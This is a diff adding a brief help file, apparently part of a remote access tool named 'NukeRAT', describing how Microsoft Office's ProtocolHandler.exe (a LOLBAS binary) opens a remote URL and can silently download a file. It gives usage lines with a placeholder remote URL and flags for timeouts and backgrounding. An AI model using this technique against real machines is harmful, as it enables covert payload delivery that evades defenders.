@@ -1,0 +1,18 @@
+ABOUT
+    Microsoft Office binary. LOLBAS documents open the specified URL in
+    the default web browser, which (if the URL points to a file) will
+    often result in the file being downloaded to the user's Downloads
+    folder (without user interaction).
+
+USAGE:
+    ProtocolHandler.exe {REMOTEURL}
+
+EXAMPLES:
+    ProtocolHandler.exe {REMOTEURL}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    ProtocolHandler.exe {REMOTEURL}
